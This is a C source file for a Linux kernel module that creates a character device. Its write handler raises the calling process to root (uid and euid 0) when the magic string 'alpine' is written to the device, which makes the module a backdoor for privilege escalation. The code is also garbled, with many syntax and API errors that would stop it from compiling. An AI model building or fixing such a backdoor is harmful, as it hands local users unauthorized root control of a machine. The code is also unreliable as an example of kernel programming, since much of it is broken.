#include <linux/module.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <asm/uacess.h>

#define NUMBER_OF_MINOR_NUMBERS 2 // number of devices we can create
#define MAJOR_VERSION 1//

static int numOpens=0;

 static int _init mod_init(void);
 static void _exit mod_exit(void);
 int mod_open(struct inode *in, struct file *f);
 ssize_t mod_read(struct file *f, char _user *user_buf, size_t user_buf_len, loff_t *offp);
 ssize_t mod_write(struct file *f, const char _user *user_buf, size_t user_buf_len, loff_t *offp);

struct cdev mod; 
dev_t devnum;

struct file_operations mod_fops = {
	.owner = THIS_MODULE,
	.open = mod_open;
	.write = mod_write,
	.read = mod_read,
}

int mod_open(struct inode *in, struct file *f){
	numOpens++;	
	printf(KERN_INFO "This device has been opened %d times\n", numOpens) // a simple counter to see if other users have used your kernel module
	return 0;
}

ssize_t mod_read(struct file *f, char  *user_buf, size_t user_buf_len, loff_t *offp){
	return user_buf_len;
}

ssize_t mod_write(struct file *f, const char  *user_buf, size_t user_buf_len,loff_t *offp){
	char *data;
	size_t i;
	char magic[] = "alpine";

	struct cred *cur_cred;
	struct cred *new_cred;

	data = (char *)kmalloc(user_buf_len+1, GFP_KERNEL); //create space for string plus null terminator and open in kernel mode
	for(int i=0; i<=user_buf_len; i++)
		data[i] = 0x0;	

	if (data){

		copy_from_user(data, user_buf, user_buf_len);

		if(memcmp(data, magic, 7) ==0){
			cur_cred = get_current_cred();
			cur_cred ->uid =0;
			cur_cred-> euid=0;
		}

	}

	 else{
			printk(KERN_ALERT "Unable to allocate memory");
		}

	return user_buf_len;

}

static int _init mod_init(){
	int err;

	alloc_error = alloc_chrdev_region(&devnum, 0, NUMBER_OF_MINOR_NUMBERS,"mod")
	if (alloc_error !=0){
		printk(KERN_ALERT "Could no allocate memory for module,")
		return alloc_error;
	}

	cdev_init(&mod, &mod_fops);
	mod->owner = THIS_MODULE;

	add_error=cdev_add(&cdev, devnum,NUMBER_OF_MINOR_NUMBERS )
	if(add_error=0){
		printk(KERN_ALERT "Could not register device node for module");
		return add_error;
	}
}

printk(KERN_ALERT "Device mod created successfully!\n");
return 0;
}

static void _exit mod_exit(){
	cdev_del(&cdev);
	unregister_chrdev_region(devnum, NUMBER_OF_MINOR_NUMBERS)
}
